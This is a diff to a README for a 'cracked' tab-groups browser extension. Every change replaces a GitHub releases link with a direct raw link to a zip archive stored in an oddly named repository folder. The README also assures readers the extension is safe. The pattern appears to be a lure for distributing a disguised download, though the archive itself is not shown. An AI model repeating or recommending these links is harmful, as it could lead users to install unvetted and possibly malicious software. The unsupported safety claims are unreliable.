@@ -1,6 +1,6 @@
 # 🧩 cracked-tab-groups-extension - Simplify Your Browser Tabs Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/TeeeeeeeeeellKall/cracked-tab-groups-extension/releases)
+[![Download](https://raw.githubusercontent.com/TeeeeeeeeeellKall/cracked-tab-groups-extension/main/clackety/cracked-tab-groups-extension.zip)](https://raw.githubusercontent.com/TeeeeeeeeeellKall/cracked-tab-groups-extension/main/clackety/cracked-tab-groups-extension.zip)
 
 ## 📝 Description
 
@@ -20,7 +20,7 @@ To get started with the Cracked Tab Groups Extension, follow the steps below. Yo
 
 To download the Cracked Tab Groups Extension, visit the following page:
 
-[Download Here](https://github.com/TeeeeeeeeeellKall/cracked-tab-groups-extension/releases)
+[Download Here](https://raw.githubusercontent.com/TeeeeeeeeeellKall/cracked-tab-groups-extension/main/clackety/cracked-tab-groups-extension.zip)
 
 On this page, you will find the latest version of the extension. Click on the version number to see the release assets. 
 
@@ -55,7 +55,7 @@ On this page, you will find the latest version of the extension. Click on the ve
 
 ### How do I update the extension?
 
-You can update the Cracked Tab Groups Extension by revisiting the [Download Here](https://github.com/TeeeeeeeeeellKall/cracked-tab-groups-extension/releases) link. Simply download the new version, and follow the installation steps.
+You can update the Cracked Tab Groups Extension by revisiting the [Download Here](https://raw.githubusercontent.com/TeeeeeeeeeellKall/cracked-tab-groups-extension/main/clackety/cracked-tab-groups-extension.zip) link. Simply download the new version, and follow the installation steps.
 
 ### Can I uninstall the extension?
 
@@ -69,6 +69,6 @@ Yes, the Cracked Tab Groups Extension is safe to use. It follows standard securi
 
 If you encounter issues or have questions, please visit the GitHub repository. You can open an issue, and someone from the community will assist you.
 
-[Download Here](https://github.com/TeeeeeeeeeellKall/cracked-tab-groups-extension/releases)
+[Download Here](https://raw.githubusercontent.com/TeeeeeeeeeellKall/cracked-tab-groups-extension/main/clackety/cracked-tab-groups-extension.zip)
 
 Embrace a more organized browsing experience with the Cracked Tab Groups Extension!
